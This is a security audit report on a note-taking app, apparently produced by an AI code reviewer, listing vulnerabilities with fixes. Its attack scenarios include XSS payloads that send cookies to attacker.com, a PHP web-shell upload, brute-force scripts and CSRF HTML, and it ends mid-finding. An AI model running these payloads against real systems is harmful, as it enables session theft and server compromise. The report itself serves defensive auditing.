# Security Audit Report - NoteFlow

**Date**: 2025-11-08
**Auditor**: Claude Code Security Review
**Scope**: Complete codebase security analysis
**Severity Levels**: Critical > High > Medium > Low

---

## Executive Summary

This security audit identified **15 security vulnerabilities** across the NoteFlow application. The most critical issues involve hardcoded admin credentials, missing rate limiting, insufficient file upload validation, and inactive encryption. While the authentication system (Clerk) is robust, several areas require immediate attention to prevent unauthorized access, data breaches, and abuse.

### Risk Overview

| Severity | Count | Status |
|----------|-------|--------|
| 🔴 Critical | 5 | Requires immediate action |
| 🟠 High | 5 | Address in next sprint |
| 🟡 Medium | 5 | Schedule for backlog |

---

## 🔴 Critical Severity Issues

### C1. Hardcoded Admin Emails with Placeholder Values

**File**: `convex/adminAudit.ts:31`, `convex/adminAudit.ts:87`
**Severity**: Critical
**CVSS Score**: 9.1 (Critical)

**Vulnerability**:
```typescript
const ADMIN_EMAILS = [
  "your-email@example.com", // Replace with your actual admin email
];
```

**Issue**:
- Admin access control relies on hardcoded email array
- Contains placeholder email that will fail in production
- No dynamic role management system
- Changes require code deployment

**Attack Scenario**:
1. Production deployment occurs without updating admin emails
2. Admin functions completely inaccessible
3. Or worse: old admin retains access after leaving company

**Impact**:
- Complete admin access failure in production
- Inability to respond to security incidents
- Audit log system becomes unusable
- Compliance violations (GDPR, SOC2)

**Remediation**:

**Immediate (Hotfix)**:
```typescript
// In convex/adminAudit.ts
const ADMIN_EMAILS = process.env.ADMIN_EMAILS?.split(',') || [];

if (ADMIN_EMAILS.length === 0) {
  throw new Error("ADMIN_EMAILS not configured - check environment variables");
}
```

**Long-term (Proper Fix)**:
1. Create `adminRoles` table in schema
2. Add admin management UI
3. Implement role-based access control (RBAC)
4. Add audit trail for role changes

```typescript
// Add to schema.ts
adminRoles: defineTable({
  userId: v.id("users"),
  role: v.union(v.literal("admin"), v.literal("superadmin")),
  grantedBy: v.id("users"),
  grantedAt: v.number(),
  revokedAt: v.optional(v.number()),
}).index("by_user_active", ["userId", "revokedAt"])
```

**References**: CWE-798 (Use of Hard-coded Credentials)

---

### C2. Missing Rate Limiting on Public Endpoints

**File**: `convex/publicShare.ts:60-79`
**Severity**: Critical
**CVSS Score**: 7.5 (High)

**Vulnerability**:
```typescript
export const incrementShareView = mutation({
  args: { shareId: v.string() },
  handler: async (ctx, { shareId }) => {
    // NO AUTH CHECK - This is a public endpoint!
    // NO RATE LIMITING!

    if (share && share.isActive) {
      await ctx.db.patch(share._id, {
        viewCount: share.viewCount + 1, // Can be inflated infinitely
        lastAccessedAt: Date.now(),
      });
    }
  },
});
```

**Issue**:
- No rate limiting on public mutation
- No IP-based throttling
- No CAPTCHA or bot protection
- Can be called unlimited times

**Attack Scenarios**:

**Scenario 1: View Count Inflation**:
```bash
# Automated script to inflate view count
for i in {1..10000}; do
  curl -X POST "https://api.convex.dev/incrementShareView" \
    -d '{"shareId":"abc123xyz"}'
done
```

**Scenario 2: Share ID Enumeration**:
```python
# Brute force to find valid share IDs
import itertools
import requests

chars = "abcdefghijklmnopqrstuvwxyz0123456789"
for attempt in itertools.product(chars, repeat=16):
    share_id = ''.join(attempt)
    resp = requests.post(api_url, json={"shareId": share_id})
    if resp.status_code == 200:
        print(f"Found valid share: {share_id}")
```

**Scenario 3: Denial of Service**:
- Flood server with millions of view increment requests
- Exhaust database write capacity
- Increase Convex billing costs significantly

**Impact**:
- Analytics manipulation (fake view counts)
- Share ID discovery through brute force
- Denial of service attacks
- Unexpected cloud costs (Convex charges per operation)

**Remediation**:

**Immediate (Convex Middleware)**:
```typescript
// Create convex/rateLimit.ts
import { mutation } from "./_generated/server";

const RATE_LIMITS = new Map<string, { count: number; resetAt: number }>();

export async function checkRateLimit(
  identifier: string,
  maxRequests: number,
  windowMs: number
): Promise<boolean> {
  const now = Date.now();
  const limit = RATE_LIMITS.get(identifier);

  if (!limit || now > limit.resetAt) {
    RATE_LIMITS.set(identifier, { count: 1, resetAt: now + windowMs });
    return true;
  }

  if (limit.count >= maxRequests) {
    return false; // Rate limit exceeded
  }

  limit.count++;
  return true;
}

// Update incrementShareView
export const incrementShareView = mutation({
  args: { shareId: v.string() },
  handler: async (ctx, { shareId }) => {
    // Rate limit: 10 views per minute per shareId
    const allowed = await checkRateLimit(shareId, 10, 60000);
    if (!allowed) {
      throw new Error("Rate limit exceeded. Please try again later.");
    }

    // ... rest of the code
  },
});
```

**Long-term (Edge Rate Limiting)**:
- Implement Cloudflare or Vercel Edge rate limiting
- Add CAPTCHA for suspicious patterns
- Track and block abusive IP addresses

**References**: CWE-770 (Allocation of Resources Without Limits)

---

### C3. Insufficient File Upload Validation

**File**: `lib/imageUpload.ts:39-46`
**Severity**: Critical
**CVSS Score**: 8.8 (High)

**Vulnerability**:
```typescript
// Validate file type
if (!file.type.startsWith("image/")) {
  return { storageId: "", error: "Please select an image file" };
}

// Validate file size (max 5MB)
const MAX_FILE_SIZE = 5 * 1024 * 1024;
if (file.size > MAX_FILE_SIZE) {
  return { storageId: "", error: "Image size must be less than 5MB" };
}
```

**Issues**:
1. **MIME Type Spoofing**: Client-provided `file.type` can be easily faked
2. **No Magic Byte Verification**: Doesn't check actual file headers
3. **SVG XSS Risk**: SVG files can contain embedded JavaScript
4. **No Malware Scanning**: Could upload malicious images
5. **No Image Processing**: Doesn't verify file is actually a valid image

**Attack Scenarios**:

**Scenario 1: SVG XSS Attack**:
```svg
<!-- malicious.svg -->
<svg xmlns="http://www.w3.org/2000/svg">
  <script>
    // Steal user's session token
    fetch('https://attacker.com/steal?token=' + document.cookie);
  </script>
  <circle cx="50" cy="50" r="40" />
</svg>
```
Upload this as cover image → When viewed, executes JavaScript

**Scenario 2: MIME Type Spoofing**:
```javascript
// Malicious upload
const maliciousFile = new File(
  ["<?php system($_GET['cmd']); ?>"],
  "shell.jpg",
  { type: "image/jpeg" } // Fake MIME type
);
```

**Scenario 3: Polyglot File**:
- File that's both a valid image AND executable code
- Bypass MIME checks but execute malicious payload

**Impact**:
- Cross-Site Scripting (XSS) attacks
- Session hijacking
- Malware distribution
- Server compromise (if improperly served)
- Legal liability (hosting malicious content)

**Remediation**:

**Immediate (Magic Byte Validation)**:
```typescript
// Add to lib/imageUpload.ts

const ALLOWED_IMAGE_SIGNATURES = {
  'image/jpeg': [0xFF, 0xD8, 0xFF],
  'image/png': [0x89, 0x50, 0x4E, 0x47],
  'image/gif': [0x47, 0x49, 0x46],
  'image/webp': [0x52, 0x49, 0x46, 0x46],
};

async function validateImageFile(file: File): Promise<boolean> {
  // Read first 12 bytes
  const buffer = await file.slice(0, 12).arrayBuffer();
  const bytes = new Uint8Array(buffer);

  // Block SVG completely (XSS risk)
  if (file.type === 'image/svg+xml') {
    return false;
  }

  // Verify magic bytes match MIME type
  const signature = ALLOWED_IMAGE_SIGNATURES[file.type];
  if (!signature) return false;

  return signature.every((byte, i) => bytes[i] === byte);
}

// Update uploadImageToConvex
export async function uploadImageToConvex(...) {
  // Existing MIME type check
  if (!file.type.startsWith("image/")) {
    return { storageId: "", error: "Please select an image file" };
  }

  // NEW: Magic byte validation
  const isValidImage = await validateImageFile(file);
  if (!isValidImage) {
    return {
      storageId: "",
      error: "Invalid image file. File type doesn't match content."
    };
  }

  // ... rest of upload logic
}
```

**Additional Hardening**:
```typescript
// Block dangerous file extensions even if MIME type looks OK
const BLOCKED_EXTENSIONS = ['.svg', '.svgz', '.php', '.exe', '.sh'];
const fileExt = file.name.toLowerCase().match(/\.[^.]+$/)?.[0];
if (fileExt && BLOCKED_EXTENSIONS.includes(fileExt)) {
  return { storageId: "", error: "File type not allowed" };
}
```

**Long-term (Image Processing)**:
1. Use server-side image processing library (sharp, jimp)
2. Re-encode all uploads to strip metadata/scripts
3. Generate thumbnails server-side
4. Implement virus scanning (ClamAV)
5. Set proper Content-Security-Policy headers

```typescript
// Convex function to process image
export const processUploadedImage = internalMutation({
  args: { storageId: v.string() },
  handler: async (ctx, { storageId }) => {
    // Download from storage
    const blob = await ctx.storage.get(storageId);

    // Re-encode with sharp (strips all metadata and scripts)
    const processed = await sharp(blob)
      .jpeg({ quality: 85 }) // Force JPEG format
      .resize(2000, 2000, { fit: 'inside', withoutEnlargement: true })
      .toBuffer();

    // Upload processed version
    const newStorageId = await ctx.storage.store(processed);

    // Delete original
    await ctx.storage.delete(storageId);

    return newStorageId;
  }
});
```

**References**:
- CWE-434 (Unrestricted Upload of File with Dangerous Type)
- CWE-79 (Cross-site Scripting)
- OWASP File Upload Cheat Sheet

---

### C4. No Input Sanitization for User-Generated Content

**Files**: `convex/notes.ts`, `convex/schema.ts:29-31`
**Severity**: Critical
**CVSS Score**: 7.2 (High)

**Vulnerability**:
```typescript
// schema.ts
notes: defineTable({
  title: v.string(), // No sanitization
  content: v.string(), // No sanitization - can contain HTML/scripts
  blocks: v.optional(v.string()), // JSON string - no validation
  // ...
})

// notes.ts
export const createNote = mutation({
  handler: async (ctx, { title, content }) => {
    // Directly stores user input without sanitization
    await ctx.db.insert("notes", {
      title,
      content: content || "",
      // ...
    });
  },
});
```

**Issues**:
1. No HTML sanitization on note content
2. No XSS protection when rendering notes
3. `blocks` field stores raw JSON without validation
4. Title field could contain script tags
5. No Content-Security-Policy headers visible

**Attack Scenarios**:

**Scenario 1: Stored XSS in Note Content**:
```javascript
// Attacker creates a shared note with malicious content
const maliciousContent = `
  <img src=x onerror="
    // Steal authentication token
    fetch('https://attacker.com/steal', {
      method: 'POST',
      body: JSON.stringify({
        token: document.cookie,
        url: window.location.href
      })
    });
  ">

  <h1>Legitimate Looking Note</h1>
  <p>Click here for more info</p>
`;

await createNote({
  title: "Important Document",
  content: maliciousContent
});
```

**Scenario 2: JSON Injection in Blocks**:
```javascript
const maliciousBlocks = JSON.stringify({
  type: "paragraph",
  children: [{
    text: "Normal text",
    onClick: "javascript:alert(document.cookie)" // Injected handler
  }]
});

await updateNote({
  noteId: "...",
  blocks: maliciousBlocks
});
```

**Scenario 3: Share Link XSS**:
1. Create note with malicious content
2. Share publicly via `/share/xxx`
3. When anyone views the shared note → XSS executes
4. Steal their session, redirect to phishing site, etc.

**Impact**:
- **Session Hijacking**: Steal Clerk authentication tokens
- **Account Takeover**: Impersonate users
- **Data Exfiltration**: Access all user's notes
- **Worm Attacks**: XSS that spreads to other users' notes
- **Phishing**: Redirect users to fake login pages
- **Keylogging**: Capture passwords entered on the page

**Remediation**:

**Immediate (Client-side Sanitization)**:
```bash
npm install dompurify isomorphic-dompurify
```

```typescript
// lib/sanitize.ts
import DOMPurify from 'isomorphic-dompurify';

export function sanitizeHtml(dirty: string): string {
  return DOMPurify.sanitize(dirty, {
    ALLOWED_TAGS: ['b', 'i', 'u', 'strong', 'em', 'p', 'br', 'h1', 'h2', 'h3', 'ul', 'ol', 'li', 'a'],
    ALLOWED_ATTR: ['href', 'target', 'rel'],
    ALLOW_DATA_ATTR: false,
  });
}

export function sanitizeNoteTitle(title: string): string {
  // Strip all HTML from titles
  return DOMPurify.sanitize(title, { ALLOWED_TAGS: [] });
}

// Validate blocks JSON structure
export function validateBlocks(blocksJson: string): boolean {
  try {
    const blocks = JSON.parse(blocksJson);
    // Add schema validation here
    return Array.isArray(blocks);
  } catch {
    return false;
  }
}
```

```typescript
// Update convex/notes.ts
import { sanitizeHtml, sanitizeNoteTitle } from "../lib/sanitize";

export const createNote = mutation({
  handler: async (ctx, { title, content, blocks }) => {
    // Sanitize before storing
    const cleanTitle = sanitizeNoteTitle(title);
    const cleanContent = content ? sanitizeHtml(content) : "";

    // Validate blocks if provided
    if (blocks && !validateBlocks(blocks)) {
      throw new Error("Invalid blocks format");
    }

    await ctx.db.insert("notes", {
      title: cleanTitle,
      content: cleanContent,
      blocks,
      // ...
    });
  },
});
```

**Additional Protection (CSP Headers)**:
```typescript
// middleware.ts
import { NextResponse } from 'next/server';

export default clerkMiddleware(async (auth, req) => {
  const response = await auth.protect();

  // Add Content-Security-Policy
  response.headers.set(
    'Content-Security-Policy',
    "default-src 'self'; " +
    "script-src 'self' 'unsafe-inline' https://clerk.com; " +
    "style-src 'self' 'unsafe-inline'; " +
    "img-src 'self' data: https:; " +
    "connect-src 'self' https://*.convex.cloud https://clerk.com;"
  );

  return response;
});
```

**Long-term**:
1. Implement Content-Security-Policy (CSP) headers
2. Use a rich text editor with built-in sanitization (TipTap, Slate)
3. Server-side validation with Zod schemas
4. Regular security audits of rendered content

**References**:
- CWE-79 (Cross-site Scripting)
- OWASP XSS Prevention Cheat Sheet

---

### C5. End-to-End Encryption Implemented but Inactive

**File**: `lib/encryption.ts`, `hooks/useNoteEncryption.ts`
**Severity**: Critical (Data Privacy)
**CVSS Score**: 7.5 (High)

**Vulnerability**:
```typescript
// lib/encryption.ts - FULLY IMPLEMENTED
export async function encryptNote(
  plaintext: string,
  userId: string,
  userSecret: string
): Promise<string> {
  // AES-GCM encryption with PBKDF2 key derivation
  // ... working code ...
}

// But NOT USED in note editor!
// Notes currently stored in PLAINTEXT
```

**Issue**:
- Complete encryption system exists and is production-ready
- NOT integrated into note creation/editing workflow
- All notes stored in plaintext in Convex database
- Database admin can read all user notes
- Backup systems expose unencrypted notes

**Attack Scenarios**:

**Scenario 1: Database Breach**:
- Attacker gains access to Convex database backups
- All notes readable in plaintext
- Sensitive information exposed (passwords, API keys, personal data)

**Scenario 2: Insider Threat**:
- Malicious Convex employee accesses production database
- Reads sensitive user notes without detection
- No audit trail of database-level access

**Scenario 3: Subpoena/Legal Request**:
- Government requests user data
- Notes handed over in plaintext
- No plausible deniability (zero-knowledge architecture)

**Scenario 4: Backup Exposure**:
- Database backup accidentally made public
- S3 bucket misconfiguration
- All historical notes leaked

**Impact**:
- **Privacy Violation**: Users expect private notes to be private
- **Compliance Risk**: GDPR, HIPAA violations for sensitive data
- **Competitive Risk**: Business secrets exposed
- **Reputational Damage**: "NoteFlow leaked my private notes"
- **Legal Liability**: Lawsuits from affected users

**Current Implementation Review**:
```typescript
// Encryption system is COMPLETE and uses strong cryptography:

✅ AES-GCM (256-bit) - Industry standard
✅ PBKDF2 (100k iterations, SHA-256) - Strong key derivation
✅ Random IV per encryption - Prevents pattern analysis
✅ Client-side only - Server never sees plaintext
✅ Key derived from userId + sessionToken - Per-user keys

// Just needs to be ACTIVATED in the note editor!
```

**Remediation**:

**Immediate (Activate Encryption)**:

```typescript
// Update modules/notes/NoteEditor.tsx

import { useNoteEncryption } from "@/hooks/useNoteEncryption";

function NoteEditor({ noteId }) {
  const { encrypt, decrypt, isReady } = useNoteEncryption();
  const updateNote = useMutation(api.notes.updateNote);

  // When saving note
  const handleSave = async (content: string) => {
    if (!isReady) {
      console.error("Encryption not ready");
      return;
    }

    // Encrypt before sending to server
    const encryptedContent = await encrypt(content);

    await updateNote({
      noteId,
      content: encryptedContent,
      contentType: "encrypted" // NEW: Mark as encrypted
    });
  };

  // When loading note
  const handleLoad = async (encryptedContent: string) => {
    if (!isReady) return;

    try {
      const plaintext = await decrypt(encryptedContent);
      setEditorContent(plaintext);
    } catch (err) {
      console.error("Decryption failed - wrong key or corrupted data");
      // Show error to user
    }
  };

  // ...
}
```

**Schema Update**:
```typescript
// convex/schema.ts
notes: defineTable({
  // ...
  contentType: v.optional(
    v.union(
      v.literal("plain"),
      v.literal("rich"),
      v.literal("encrypted") // NEW
    )
  ),
  isEncrypted: v.optional(v.boolean()), // Quick check flag
  // ...
})
```

**Migration Strategy**:
```typescript
// Gradual rollout to avoid breaking existing notes

export const migrateNoteToEncryption = mutation({
  args: { noteId: v.id("notes") },
  handler: async (ctx, { noteId }) => {
    const userId = await getAuthenticatedUserId(ctx);
    const note = await ctx.db.get(noteId);

    if (!note || note.userId !== userId) {
      throw new Error("Unauthorized");
    }

    // Check if already encrypted
    if (note.contentType === "encrypted") {
      return { alreadyEncrypted: true };
    }

    // Client will handle encryption and call updateNote
    return { needsEncryption: true, content: note.content };
  }
});
```

**Long-term Considerations**:
1. **Key Management**: User loses session → loses all notes unless key backed up
2. **Search**: Can't search encrypted content server-side (need client-side indexing)
3. **Sharing**: Encrypted notes can't be shared (need key sharing mechanism)
4. **Recovery**: Need master password or recovery key system
5. **Performance**: 100k PBKDF2 iterations may be slow on mobile (consider Web Workers)

**Recommended Approach**:
```typescript
// Make encryption OPTIONAL but ENCOURAGED

// Settings page
<Switch
  label="Enable End-to-End Encryption"
  description="Your notes will be encrypted before leaving your device. Even we can't read them."
  checked={settings.encryptionEnabled}
  onChange={handleToggleEncryption}
/>

<Alert variant="warning">
  If you enable encryption, you'll need your master password to access notes from new devices.
  There is NO password recovery if you forget it.
</Alert>
```

**References**:
- CWE-311 (Missing Encryption of Sensitive Data)
- CWE-312 (Cleartext Storage of Sensitive Information)

---

## 🟠 High Severity Issues

### H1. Information Disclosure in Health Endpoint

**File**: `app/api/health/route.ts:10`
**Severity**: High
**CVSS Score**: 5.3 (Medium)

**Vulnerability**:
```typescript
const health = {
  status: 'ok',
  timestamp: new Date().toISOString(),
  uptime: process.uptime(),
  environment: process.env.NODE_ENV, // ⚠️ EXPOSES ENVIRONMENT
  version: process.env.npm_package_version || '0.1.0',
};
```

**Issue**:
- Publicly exposes `NODE_ENV` (production/development/staging)
- Reveals application version number
- Could aid attackers in reconnaissance
- Helps identify dev/staging environments for easier exploitation

**Attack Scenario**:
```bash
# Attacker checks health endpoint
curl https://noteflow.app/api/health

{
  "status": "ok",
  "environment": "production",  # Now attacker knows this is production
  "version": "0.1.0"            # Can search for version-specific vulnerabilities
}
```

**Impact**:
- **Environment Fingerprinting**: Attackers know which environment they're targeting
- **Version Disclosure**: Can search CVE databases for known vulnerabilities in that version
- **Staging Environment Discovery**: Find dev/staging instances that may have weaker security

**Remediation**:
```typescript
// app/api/health/route.ts
export async function GET() {
  try {
    const health = {
      status: 'ok',
      timestamp: new Date().toISOString(),
      // REMOVED: environment
      // REMOVED: version
    };

    return NextResponse.json(health, { status: 200 });
  } catch (error) {
    return NextResponse.json(
      { status: 'error', timestamp: new Date().toISOString() },
      { status: 503 }
    );
  }
}

// For internal monitoring, create authenticated endpoint
export async function GET(req: Request) {
  const authHeader = req.headers.get('Authorization');

  if (authHeader !== `Bearer ${process.env.INTERNAL_HEALTH_TOKEN}`) {
    return NextResponse.json({ status: 'ok' }, { status: 200 });
  }

  // Detailed health info for authenticated monitoring systems
  return NextResponse.json({
    status: 'ok',
    environment: process.env.NODE_ENV,
    version: process.env.npm_package_version,
    uptime: process.uptime(),
    memory: process.memoryUsage(),
    database: await checkDatabaseConnection(),
  });
}
```

**References**: CWE-200 (Exposure of Sensitive Information)

---

### H2. User Enumeration via Authentication Error Messages

**File**: `convex/auth.ts:14-29`
**Severity**: High
**CVSS Score**: 5.3 (Medium)

**Vulnerability**:
```typescript
const identity = await ctx.auth.getUserIdentity();

if (!identity) {
  throw new Error("Unauthenticated"); // Error #1
}

const user = await ctx.db
  .query("users")
  .withIndex("by_clerk_user_id", (q) => q.eq("clerkUserId", clerkUserId))
  .first();

if (!user) {
  throw new Error("User not found"); // Error #2 - Different message!
}
```

**Issue**:
- Two different error messages reveal system state
- "Unauthenticated" → Valid Clerk account but not in DB
- "User not found" → Different error path
- Allows attackers to enumerate which Clerk accounts exist

**Attack Scenario**:
```python
# Enumerate valid Clerk accounts
test_emails = ["user1@example.com", "user2@example.com", ...]

for email in test_emails:
    try:
        response = attempt_login(email)
    except Exception as e:
        if "Unauthenticated" in str(e):
            print(f"{email}: Valid Clerk account, not in app DB")
        elif "User not found" in str(e):
            print(f"{email}: Different error path")
        else:
            print(f"{email}: Unknown error")
```

**Impact**:
- Identify valid Clerk accounts
- Build list of potential targets for phishing
- Understand user registration flow
- Aid in account takeover attempts

**Remediation**:
```typescript
export async function getAuthenticatedUserId(
  ctx: QueryCtx | MutationCtx
): Promise<Id<"users">> {
  const identity = await ctx.auth.getUserIdentity();

  if (!identity) {
    throw new Error("Authentication required"); // Generic message
  }

  const clerkUserId = identity.subject;
  const user = await ctx.db
    .query("users")
    .withIndex("by_clerk_user_id", (q) => q.eq("clerkUserId", clerkUserId))
    .first();

  if (!user) {
    // Log this case - might indicate sync issue between Clerk and Convex
    console.error(`Clerk user ${clerkUserId} not found in database`);
    throw new Error("Authentication required"); // SAME generic message
  }

  return user._id;
}
```

**Additional Hardening**:
- Use constant-time comparison for sensitive checks
- Rate limit login attempts
- Monitor for enumeration patterns (many failed auth from same IP)

**References**: CWE-209 (Generation of Error Message Containing Sensitive Information)

---

### H3. Share ID Brute Force Potential

**File**: `convex/publicShare.ts:9-53`
**Severity**: High
**CVSS Score**: 6.5 (Medium)

**Vulnerability**:
```typescript
export const getSharedNote = query({
  args: { shareId: v.string() }, // No validation
  handler: async (ctx, { shareId }) => {
    // NO AUTH CHECK - This is a public endpoint!
    // NO RATE LIMITING!

    const share = await ctx.db
      .query("sharedNotes")
      .withIndex("by_share_id", (q) => q.eq("shareId", shareId))
      .first();

    // Returns note if found - no protection against brute force
  },
});
```

**Issue**:
1. Share IDs are 16 characters (nanoid)
2. Character space: a-zA-Z0-9_ (64 possibilities per char)
3. Total combinations: 64^16 = 7.9 × 10^28 (very large)
4. BUT: No rate limiting on guesses
5. No monitoring for enumeration attempts
6. Weak validation (just checks length)

**Attack Scenario**:
```python
# Distributed brute force attack
# Using 1000 servers, each testing 1M shareIds/sec

import requests
import string
import random

def generate_share_id():
    chars = string.ascii_letters + string.digits + '_-'
    return ''.join(random.choices(chars, k=16))

found_shares = []
attempts = 0

while True:
    share_id = generate_share_id()
    attempts += 1

    try:
        resp = requests.get(f"https://noteflow.app/api/getSharedNote?shareId={share_id}")

        if resp.status_code == 200 and resp.json() is not None:
            found_shares.append(share_id)
            print(f"FOUND: {share_id}")
            # Now read private shared notes!
    except:
        pass

    if attempts % 1000000 == 0:
        print(f"Tested {attempts:,} shareIds, found {len(found_shares)}")
```

**Probability Analysis**:
```
Search space: 64^16 = 7.9 × 10^28
Attack rate: 1B guesses/sec (1000 servers × 1M/sec each)
Time to 50% probability: ~1.25 × 10^12 years

However:
- If only 1000 notes are shared, probability much higher
- Can focus on recently created shares (incremental search)
- timing attacks might reveal valid vs invalid shareIds
```

**Impact**:
- Unauthorized access to shared notes
- Privacy breach of "private" shared links
- Competitive intelligence gathering
- Increased server costs from attack traffic

**Remediation**:

**Immediate**:
```typescript
// lib/shareUtils.ts
export function validateShareId(shareId: string): boolean {
  // Stronger validation
  return (
    typeof shareId === 'string' &&
    shareId.length === 16 &&
    /^[a-zA-Z0-9_-]+$/.test(shareId) // Only valid nanoid chars
  );
}

// convex/publicShare.ts
export const getSharedNote = query({
  args: { shareId: v.string() },
  handler: async (ctx, { shareId }) => {
    // Validate format first
    if (!validateShareId(shareId)) {
      return null; // Don't reveal if format is invalid
    }

    // Rate limiting (needs implementation)
    const rateLimited = await checkRateLimit(
      `share:${shareId}`,
      100, // 100 requests per hour per shareId
      3600000
    );

    if (rateLimited) {
      throw new Error("Too many requests. Please try again later.");
    }

    // ... existing code
  },
});
```

**Long-term**:
1. Increase shareId length to 24 characters (64^24 = 3.2 × 10^43)
2. Add expiration dates to share links
3. Require CAPTCHA after N failed attempts from same IP
4. Add "password protection" option for shares
5. Monitor access patterns and block suspicious IPs

```typescript
// Enhanced share creation with expiration
export const createShareLink = mutation({
  args: {
    noteId: v.id("notes"),
    expiresInDays: v.optional(v.number()), // NEW
    requirePassword: v.optional(v.boolean()), // NEW
    password: v.optional(v.string()), // NEW (hashed)
  },
  handler: async (ctx, args) => {
    const shareId = nanoid(24); // Increased from 16 to 24
    const expiresAt = args.expiresInDays
      ? Date.now() + (args.expiresInDays * 24 * 60 * 60 * 1000)
      : undefined;

    await ctx.db.insert("sharedNotes", {
      shareId,
      noteId: args.noteId,
      expiresAt,
      passwordHash: args.password ? await hashPassword(args.password) : undefined,
      // ...
    });
  }
});
```

**References**:
- CWE-307 (Improper Restriction of Excessive Authentication Attempts)
- CWE-330 (Use of Insufficiently Random Values)

---

### H4. Missing CSRF Protection

**File**: `middleware.ts`
**Severity**: High
**CVSS Score**: 6.5 (Medium)

**Issue**:
- No visible CSRF token validation
- Relies on Clerk + Next.js defaults
- Should verify CSRF protection is active
- Mutations could be triggered from malicious sites

**Attack Scenario**:
```html
<!-- Attacker's website: evil.com -->
<form action="https://noteflow.app/api/notes/delete" method="POST">
  <input type="hidden" name="noteId" value="victim-note-id">
</form>

<script>
  // Automatically submit when victim visits page
  document.forms[0].submit();
</script>

<!-- If victim is logged into NoteFlow, their session cookie
     is sent automatically, and the note gets deleted! -->
```

**Impact**:
- Unwanted actions performed on behalf of authenticated users
- Note deletion, modification, or creation
- Settings changes
- Share link creation/revocation

**Remediation**:

**Verify Clerk CSRF Protection**:
```typescript
// middleware.ts
import { clerkMiddleware } from "@clerk/nextjs/server";

export default clerkMiddleware(async (auth, req) => {
  // Clerk should handle CSRF automatically via JWT
  // But verify with double-submit cookie pattern for mutations

  if (req.method !== 'GET' && req.method !== 'HEAD') {
    // Verify Origin header matches host
    const origin = req.headers.get('origin');
    const host = req.headers.get('host');

    if (origin && !origin.includes(host || '')) {
      return new Response('CSRF validation failed', { status: 403 });
    }
  }

  // ... rest of auth logic
});
```

**For Convex Mutations** (already protected):
- Convex uses JWT tokens which are immune to CSRF
- Tokens sent in Authorization header, not cookies
- ✅ Already secure if using Convex client properly

**References**: CWE-352 (Cross-Site Request Forgery)

---

### H5. Missing Security Headers

**File**: `middleware.ts`, `next.config.ts`
**Severity**: High
**CVSS Score**: 5.3 (Medium)

**Issue**:
```typescript
// middleware.ts - No security headers configured
export default clerkMiddleware(async (auth, req) => {
  if (!isPublicRoute(req)) {
    await auth.protect();
  }
  // Missing: CSP, HSTS, X-Frame-Options, etc.
});
```

**Missing Headers**:
1. **Content-Security-Policy** - XSS protection
2. **Strict-Transport-Security** - Force HTTPS
3. **X-Frame-Options** - Clickjacking protection
4. **X-Content-Type-Options** - MIME sniffing protection
5. **Referrer-Policy** - Control referrer information
6. **Permissions-Policy** - Disable unnecessary browser features

**Attack Scenarios**:

**Clickjacking**:
```html
<!-- Attacker embeds NoteFlow in invisible iframe -->
<iframe src="https://noteflow.app" style="opacity:0; position:absolute; top:0"></iframe>
<button onclick="clickHiddenButton()">Click for free prize!</button>

<!-- User thinks they're clicking the button,
     but actually clicking "Delete All Notes" underneath -->
```

**HTTPS Downgrade**:
- Without HSTS, attacker can downgrade connection to HTTP
- Man-in-the-middle attack captures plaintext traffic

**Remediation**:
```typescript
// middleware.ts
import { NextResponse } from 'next/server';
import { clerkMiddleware } from "@clerk/nextjs/server";

export default clerkMiddleware(async (auth, req) => {
  // Existing auth logic
  const response = !isPublicRoute(req)
    ? await auth.protect()
    : NextResponse.next();

  // Add security headers
  const headers = response.headers;

  // Content-Security-Policy
  headers.set(
    'Content-Security-Policy',
    [
      "default-src 'self'",
      "script-src 'self' 'unsafe-inline' 'unsafe-eval' https://clerk.com https://*.convex.cloud",
      "style-src 'self' 'unsafe-inline'",
      "img-src 'self' data: https: blob:",
      "font-src 'self' data:",
      "connect-src 'self' https://*.convex.cloud https://clerk.com wss://*.convex.cloud",
      "frame-ancestors 'none'",
      "base-uri 'self'",
      "form-action 'self'",
    ].join('; ')
  );

  // Force HTTPS (1 year)
  headers.set(
    'Strict-Transport-Security',
    'max-age=31536000; includeSubDomains; preload'
  );

  // Prevent clickjacking
  headers.set('X-Frame-Options', 'DENY');

  // Prevent MIME sniffing
  headers.set('X-Content-Type-Options', 'nosniff');

  // Control referrer
  headers.set('Referrer-Policy', 'strict-origin-when-cross-origin');

  // Disable unnecessary features
  headers.set(
    'Permissions-Policy',
    'geolocation=(), microphone=(), camera=(), payment=()'
  );

  return response;
});
```

**Alternative (next.config.ts)**:
```typescript
const nextConfig = {
  async headers() {
    return [
      {
        source: '/:path*',
        headers: [
          {
            key: 'Strict-Transport-Security',
            value: 'max-age=31536000; includeSubDomains; preload'
          },
          {
            key: 'X-Frame-Options',
            value: 'DENY'
          },
          {
            key: 'X-Content-Type-Options',
            value: 'nosniff'
          },
          {
            key: 'Referrer-Policy',
            value: 'strict-origin-when-cross-origin'
          },
          // CSP in middleware for dynamic values
        ],
      },
    ];
  },
};
```

**Testing**:
```bash
# Test security headers
curl -I https://noteflow.app

# Should see:
# Strict-Transport-Security: max-age=31536000; includeSubDomains
# X-Frame-Options: DENY
# Content-Security-Policy: ...
# X-Content-Type-Options: nosniff
```

**References**:
- CWE-1021 (Improper Restriction of Rendered UI Layers)
- OWASP Secure Headers Project

---

## 🟡 Medium Severity Issues

### M1. No Audit Log Retention Policy

**File**: `convex/adminAudit.ts`
**Severity**: Medium

**Issue**:
- Admin audit logs stored indefinitely
- No automatic cleanup or archival
- GDPR compliance concerns (data minimization)
- Unbounded database growth

**Remediation**:
```typescript
// Add retention policy (e.g., 2 years)
export const cleanupOldAuditLogs = mutation({
  handler: async (ctx) => {
    const twoYearsAgo = Date.now() - (2 * 365 * 24 * 60 * 60 * 1000);

    const oldLogs = await ctx.db
      .query("adminAuditLog")
      .withIndex("by_timestamp")
      .filter((q) => q.lt(q.field("timestamp"), twoYearsAgo))
      .collect();

    for (const log of oldLogs) {
      await ctx.db.delete(log._id);
    }

    return { deleted: oldLogs.length };
  }
});

// Schedule in cron.ts
export default cron("cleanup-audit-logs", {
  monthly: { day: 1, hourUTC: 2, minuteUTC: 0 }, // 1st of each month at 2am
  handler: async (ctx) => {
    await cleanupOldAuditLogs(ctx);
  },
});
```

**References**: GDPR Article 5(1)(e) - Storage Limitation

---

### M2. Missing IP Address Capture in Audit Logs

**File**: `convex/adminAudit.ts:47`
**Severity**: Medium

**Issue**:
```typescript
ipAddress: "N/A", // Could be captured from request headers
```

**Impact**:
- Reduced forensic value of audit logs
- Can't track suspicious access patterns by IP
